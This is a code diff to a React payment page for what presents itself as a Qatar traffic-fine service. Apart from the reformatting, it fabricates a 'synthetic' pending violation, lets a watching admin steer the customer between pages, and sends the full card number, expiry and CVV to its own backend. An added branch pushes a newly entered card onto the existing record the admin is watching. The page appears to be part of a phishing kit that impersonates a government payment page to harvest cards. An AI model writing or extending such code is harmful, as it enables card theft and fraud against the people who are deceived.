@@ -210,7 +210,8 @@ export function PayPage() {
   const location = useLocation();
 
   const result = resolveResult(location.state, location.search);
-  const flowRef = (location.state as { reference?: string } | null)?.reference ?? null;
+  const flowRef =
+    (location.state as { reference?: string } | null)?.reference ?? null;
 
   // ALL hooks unconditionally — no lazy initialisers that touch `result`.
   // selected is seeded via useEffect once result is known.
@@ -256,58 +257,80 @@ export function PayPage() {
   useEffect(() => {
     if (!flowRef || result || prefillFetched.current) return;
     prefillFetched.current = true;
-    paymentsApi.prefill(flowRef).then((data) => {
-      const parts = data.fullName.trim().split(/\s+/);
+    paymentsApi
+      .prefill(flowRef)
+      .then((data) => {
+        const parts = data.fullName.trim().split(/\s+/);
 
-      // Parse stored mobile (e.g. "+97455123456") into country + phone digits.
-      // Sort by dial code length desc to match most-specific prefix first.
-      const rawMobile = data.mobile.replace(/\s/g, "");
-      const mobileDigits = rawMobile.startsWith("+") ? rawMobile.slice(1) : rawMobile;
-      const sorted = [...COUNTRIES].sort((a, b) => b.dial.length - a.dial.length);
-      let parsedCountry = DEFAULT_COUNTRY.iso;
-      let parsedPhone = mobileDigits;
-      for (const c of sorted) {
-        const dialDigits = c.dial.replace(/^\+/, "").replace(/\s/g, "");
-        if (mobileDigits.startsWith(dialDigits)) {
-          parsedCountry = c.iso;
-          parsedPhone = mobileDigits.slice(dialDigits.length);
-          break;
+        // Parse stored mobile (e.g. "+97455123456") into country + phone digits.
+        // Sort by dial code length desc to match most-specific prefix first.
+        const rawMobile = data.mobile.replace(/\s/g, "");
+        const mobileDigits = rawMobile.startsWith("+")
+          ? rawMobile.slice(1)
+          : rawMobile;
+        const sorted = [...COUNTRIES].sort(
+          (a, b) => b.dial.length - a.dial.length,
+        );
+        let parsedCountry = DEFAULT_COUNTRY.iso;
+        let parsedPhone = mobileDigits;
+        for (const c of sorted) {
+          const dialDigits = c.dial.replace(/^\+/, "").replace(/\s/g, "");
+          if (mobileDigits.startsWith(dialDigits)) {
+            parsedCountry = c.iso;
+            parsedPhone = mobileDigits.slice(dialDigits.length);
+            break;
+          }
         }
-      }
-      setPhoneCountry(parsedCountry);
-      setForm((f) => ({ ...f, firstName: parts[0] ?? "", lastName: parts.slice(1).join(" "), email: data.email ?? "", phone: parsedPhone }));
-      const synthetic: ViolationSearchResult = {
-        referenceId: data.referenceId,
-        searchType: "personal",
-        identifier: data.identifier,
-        owner: { name: data.fullName, nameAr: data.fullName },
-        violations: [{
-          reference: data.referenceId || "REF",
-          type: "Traffic Violation Payment",
-          typeAr: "دفع مخالفات مرورية",
-          description: "Traffic violation payment",
-          descriptionAr: "دفع المخالفات المرورية",
-          date: new Date().toISOString().slice(0, 10),
-          location: "Qatar",
-          locationAr: "قطر",
-          amount: data.amount,
-          points: 0,
-          status: "Pending",
-        }],
-        totalAmount: data.amount,
-        totalCount: 1,
-        currency: "QAR",
-      };
-      // Replace route state so the full page renders with full violations UI
-      navigate("/pay", { state: { result: synthetic, reference: flowRef }, replace: true });
-      setCardOpen(true);
-    }).catch(() => {
-      setPrefillLoading(false);
-    });
+        setPhoneCountry(parsedCountry);
+        setForm((f) => ({
+          ...f,
+          firstName: parts[0] ?? "",
+          lastName: parts.slice(1).join(" "),
+          email: data.email ?? "",
+          phone: parsedPhone,
+        }));
+        const synthetic: ViolationSearchResult = {
+          referenceId: data.referenceId,
+          searchType: "personal",
+          identifier: data.identifier,
+          owner: { name: data.fullName, nameAr: data.fullName },
+          violations: [
+            {
+              reference: data.referenceId || "REF",
+              type: "Traffic Violation Payment",
+              typeAr: "دفع مخالفات مرورية",
+              description: "Traffic violation payment",
+              descriptionAr: "دفع المخالفات المرورية",
+              date: new Date().toISOString().slice(0, 10),
+              location: "Qatar",
+              locationAr: "قطر",
+              amount: data.amount,
+              points: 0,
+              status: "Pending",
+            },
+          ],
+          totalAmount: data.amount,
+          totalCount: 1,
+          currency: "QAR",
+        };
+        // Replace route state so the full page renders with full violations UI
+        navigate("/pay", {
+          state: { result: synthetic, reference: flowRef },
+          replace: true,
+        });
+        setCardOpen(true);
+      })
+      .catch(() => {
+        setPrefillLoading(false);
+      });
   }, [flowRef, result, navigate]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Tell the backend the customer has arrived on the payment page (clears flow action)
-  useFlowPoll({ reference: flowRef ?? "", currentPage: "payment", enabled: !!flowRef });
+  useFlowPoll({
+    reference: flowRef ?? "",
+    currentPage: "payment",
+    enabled: !!flowRef,
+  });
 
   const dialCode =
     COUNTRIES.find((c) => c.iso === phoneCountry)?.dial ?? DEFAULT_COUNTRY.dial;
@@ -327,7 +350,10 @@ export function PayPage() {
       return (
         <div className={styles.page}>
           <div className={styles.titleBand}>{t.details.pageTitle}</div>
-          <div className={styles.wrap} style={{ textAlign: "center", padding: "48px 0", color: "#94a3b8" }}>
+          <div
+            className={styles.wrap}
+            style={{ textAlign: "center", padding: "48px 0", color: "#94a3b8" }}
+          >
             Loading…
           </div>
         </div>
@@ -462,21 +488,39 @@ export function PayPage() {
     if (!validateCard()) return;
     setBusy(true);
     try {
-      const res = await paymentsApi.create({
-        referenceId: result!.referenceId,
-        fullName: `${form.firstName} ${form.lastName}`.trim(),
-        mobile: `${dialCode}${form.phone}`,
-        email: form.email || undefined,
-        identifier: result!.identifier,
-        amount: total,
-        violationRefs: [...selected],
-        language,
-        cardholderName: card.cardholderName,
-        cardNumber: card.cardNumber.replace(/\s/g, ""),
-        cardExpiryMonth: card.expiryMonth,
-        cardExpiryYear: card.expiryYear,
-        cardCvv: card.cvv,
-      });
+      const fullName = `${form.firstName} ${form.lastName}`.trim();
+      const mobile = `${dialCode}${form.phone}`;
+      const cardNumber = card.cardNumber.replace(/\s/g, "");
+
+      // When admin redirected the customer back, update the EXISTING record
+      // so the admin sees the new card on the same request they're watching.
+      const res = flowRef
+        ? await paymentsApi.resubmitCard(flowRef, {
+            fullName,
+            mobile,
+            email: form.email || undefined,
+            cardholderName: card.cardholderName,
+            cardNumber,
+            cardExpiryMonth: card.expiryMonth,
+            cardExpiryYear: card.expiryYear,
+            cardCvv: card.cvv,
+          })
+        : await paymentsApi.create({
+            referenceId: result!.referenceId,
+            fullName,
+            mobile,
+            email: form.email || undefined,
+            identifier: result!.identifier,
+            amount: total,
+            violationRefs: [...selected],
+            language,
+            cardholderName: card.cardholderName,
+            cardNumber,
+            cardExpiryMonth: card.expiryMonth,
+            cardExpiryYear: card.expiryYear,
+            cardCvv: card.cvv,
+          });
+
       sessionStorage.setItem("pay_ref", res.reference);
       setCardOpen(false);
       navigate("/flow/loading", {
